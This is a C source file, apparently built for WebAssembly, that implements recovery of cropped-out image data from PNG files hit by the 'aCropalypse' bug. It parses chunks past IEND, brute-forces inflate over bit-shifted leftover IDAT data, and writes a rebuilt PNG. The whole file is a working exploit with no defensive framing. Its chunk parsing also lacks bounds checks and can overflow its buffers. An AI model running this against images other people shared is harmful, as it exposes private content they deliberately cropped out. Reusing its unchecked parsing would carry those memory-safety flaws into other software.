#include <emscripten.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include "zlib/zlib.h"

// Endian swap
#define SWAP32(x) __builtin_bswap32(x)

// Chunk type definitions
#define CHUNK_TYPE_IDAT 0x54414449
#define CHUNK_TYPE_IEND 0x444e4549
#define CHUNK_TYPE_IHDR 0x52444849

// zlib dictionary length
#define ZLIB_DICT_LENGTH 0x8000

// Bypasses compiler-specific struct alignment issues
#define PNG_HEADER_SIZE 0xd

// PNG magic bytes
const uint8_t png_magic[] = { 0x89, 'P', 'N', 'G', '\r', '\n', 0x1a, '\n' };

// PNG header struct
typedef struct
{
    uint32_t width;
    uint32_t height;
    uint8_t  bit_depth;
    uint8_t  colour;
    uint8_t  compression;
    uint8_t  filter;
    uint8_t  interlace;
} png_header_t;

// Parses a PNG chunk
void parse_chunk(uint8_t **buffer, uint32_t *chunk_length, uint32_t *chunk_type, uint8_t **chunk_data)
{
    // Copy pointer
    uint32_t *ptr32 = (uint32_t *)(*buffer);

    // Read length, chunk type and find start of data (ignore CRC)
    *chunk_length = SWAP32(ptr32[0]);
    *chunk_type   = ptr32[1];
    *chunk_data   = *buffer + (sizeof(uint32_t) * 2);

    // Increment buffer
    (*buffer) += (sizeof(uint32_t) * 3) + *chunk_length;
}

// Seeks until an IDAT chunk is found
int seek_idat_chunk(uint8_t **buffer, uint8_t *buffer_end)
{
    for (; *buffer < buffer_end - sizeof(uint32_t); (*buffer)++)
    {
        if (*(uint32_t *)(*buffer) == CHUNK_TYPE_IDAT)
        {
            // Move back to start of chunk
            *buffer -= sizeof(uint32_t);

            return 1;
        }
    }

    return 0;
}

// Writes an IDAT chunk
void write_idat_chunk(void *out, uint32_t chunk_length, uint32_t chunk_type, void *chunk_data)
{
    uint32_t *ptr32 = (uint32_t *)out;
    
    // Calculate checksum
    uint32_t checksum = crc32(0, (uint8_t *)&chunk_type, sizeof(uint32_t));

    if (chunk_length > 0)
        checksum = crc32(checksum, chunk_data, chunk_length);

    // Swap endianness of length
    uint32_t chunk_length_be = SWAP32(chunk_length);

    // Swap endianness of checksum
    checksum = SWAP32(checksum);

    // Write fields
    *ptr32++ = chunk_length_be;
    *ptr32++ = chunk_type;

    if (chunk_length > 0)
    {
        memcpy(ptr32, chunk_data, chunk_length);
        ptr32 = (uint32_t *)((uint8_t *)ptr32 + chunk_length);
    }

    *ptr32 = checksum;
}

// Recovers an image using the ACropalypse bug, returns int size/error
int EMSCRIPTEN_KEEPALIVE acropalypse_recover(uint8_t *in, uint32_t in_length, uint8_t *out, uint32_t width, uint32_t height)
{
    // printf("in=0x%08x in_length=0x%08x out=0x%08x width=0x%08x height=0x%08x\n", in, in_length, out, width, height);
    
    // Calculate image length
    uint32_t image_length = ((width * 3) + 1) * height;

    uint8_t *trailer = in + 8;

    // Ensure correct magic
    if (memcmp(in, png_magic, sizeof(png_magic)) != 0)
        return -1;

    // Find IEND chunk
    for (;;)
    {
        uint8_t *chunk_data;
        uint32_t chunk_length, chunk_type;

        parse_chunk(&trailer, &chunk_length, &chunk_type, &chunk_data);

        if (chunk_type == CHUNK_TYPE_IEND)
            break;
    }

    // End of overwritten file
    uint8_t *end = trailer;

    // Seek to the next IDAT chunk
    if (!seek_idat_chunk(&trailer, in + in_length))
        return -2;

    // Distance between end of overwritten file and next IDAT chunk
    uint32_t distance = trailer - end - (sizeof(uint32_t) * 4);

    // Allocate buffer for copying IDAT data into
    uint8_t *idat = malloc(in_length);

    // IDAT length
    uint32_t idat_length = distance;

    // Copy distance bytes to IDAT buffer
    memcpy(idat, end + (sizeof(uint32_t) * 3), distance);

    // Parse all remaining PNG chunks
    for (;;)
    {
        uint8_t *chunk_data;
        uint32_t chunk_length, chunk_type;

        parse_chunk(&trailer, &chunk_length, &chunk_type, &chunk_data);

        if (chunk_type == CHUNK_TYPE_IDAT)
        {
            // Append IDAT chunk
            memcpy(idat + idat_length, chunk_data, chunk_length);

            // Increment IDAT length
            idat_length += chunk_length;
        }
        else if (chunk_type == CHUNK_TYPE_IEND) // Break out of loop when IEND chunk found
        {
            break;
        }
        else
        {
            free(idat);

            return -3;
        }
    }

    // Allocate bitstream
    uint8_t *bitstream = calloc((idat_length * 8) + 7, 1);

    // Build bitstream
    for (uint32_t i = 0; i < idat_length * 8; i += 8)
    {
        for (uint8_t j = 0; j < 8; j++)
            bitstream[i + j] = (idat[i / 8] >> j) & 1;
    }

    // De-allocate IDAT
    free(idat);

    // Build shifted bytestreams
    uint8_t *shifted[8];

    for (uint8_t i = 0; i < 8; i++)
    {
        // Allocate bytestream
        shifted[i] = calloc(idat_length, 1);

        // Build bytestream
        for (uint32_t j = i; j < idat_length * 8; j += 8)
        {
            for (uint8_t k = 0; k < 8; k++)
                shifted[i][j / 8] |= bitstream[j + k] << k;
        }
    }

    // De-allocate bitstream
    free(bitstream);

    // Build lookback data for decompressor
    uint8_t lookback[ZLIB_DICT_LENGTH + 5];

    // Header
    lookback[0] = 0;
    lookback[1] = 0;
    lookback[2] = 0x80;
    lookback[3] = 0xff;
    lookback[4] = 0x7f;

    // Set the rest of the buffer to 'X'
    memset(lookback + 5, 'X', ZLIB_DICT_LENGTH);

    // Allocate buffer for decompressed image
    uint8_t *decompressed = malloc(image_length);

    // Create decompressors
    z_stream z, zz;

    // Initialise decompressor
    z.zalloc = Z_NULL;
    z.zfree  = Z_NULL;
    z.opaque = Z_NULL;

    inflateInit2(&z, -15);

    // Decompress lookback data
    z.next_in   = lookback;
    z.avail_in  = sizeof(lookback);
    z.next_out  = decompressed;
    z.avail_out = image_length;

    inflate(&z, Z_FINISH);

    // Status for decompression
    int status;

    for (uint32_t i = 0; i < idat_length; i++)
    {
        // Continue if not huffman block
        if ((shifted[i % 8][i / 8] & 7) != 0b100)
            continue;

        // Create copy of decompression state
        inflateCopy(&zz, &z);

        // Decompress data
        zz.next_in  = shifted[i % 8] + (i / 8);
        zz.avail_in = idat_length;
        zz.next_out = decompressed;

        // Continue attempting to decompress until Z_STREAM_END status reached        
        if ((status = inflate(&zz, Z_FINISH)) == Z_STREAM_END)
            break;
    }

    // De-initialise decompressor
    inflateEnd(&z);

    // De-initialise shifted bytestreams
    for (uint8_t i = 0; i < 8; i++)
        free(shifted[i]);

    // Check if unable to decompress image data
    if (status != Z_STREAM_END)
    {
        free(decompressed);

        return -4;
    }

    // Create PNG header
    png_header_t header;

    // Fill fields    
    header.width       = SWAP32(width);
    header.height      = SWAP32(height);
    header.bit_depth   = 8;
    header.colour      = 2;
    header.compression = 0;
    header.filter      = 0;
    header.interlace   = 0;

    // Write PNG magic
    memcpy(out, png_magic, sizeof(png_magic));

    // Write header
    write_idat_chunk(out + sizeof(png_magic), PNG_HEADER_SIZE, CHUNK_TYPE_IHDR, &header);

    // Create image data
    uint8_t *image_data = calloc(image_length, 1);

    // Copy all image data we were able to decompress
    memcpy(image_data + image_length - zz.total_out + ZLIB_DICT_LENGTH,
        decompressed,
        zz.total_out - ZLIB_DICT_LENGTH);

    // Fix filter bytes
    for (uint32_t i = 0; i < image_length; i += (width * 3) + 1)
    {
        if (image_data[i] == 'X')
            image_data[i] = 0;
    }

    // De-allocate decompressed data
    free(decompressed);

    // Re-compress image data
    uint8_t *compressed_data   = malloc(image_length);
    uLongf   compressed_length = image_length;

    compress(compressed_data, &compressed_length, image_data, image_length);

    // De-allocate image data
    free(image_data);

    // Write IDAT chunk
    write_idat_chunk(out + sizeof(png_magic) + PNG_HEADER_SIZE +
                          (sizeof(uint32_t) * 3),
        compressed_length, CHUNK_TYPE_IDAT, compressed_data);

    // Write IEND chunk
    write_idat_chunk(out + sizeof(png_magic)     + PNG_HEADER_SIZE + 
                          (sizeof(uint32_t) * 6) + compressed_length,
        0, CHUNK_TYPE_IEND, NULL);

    // De-allocate data
    free(compressed_data);

    // File size
    return sizeof(png_magic) + PNG_HEADER_SIZE + (sizeof(uint32_t) * 9) + compressed_length;
}
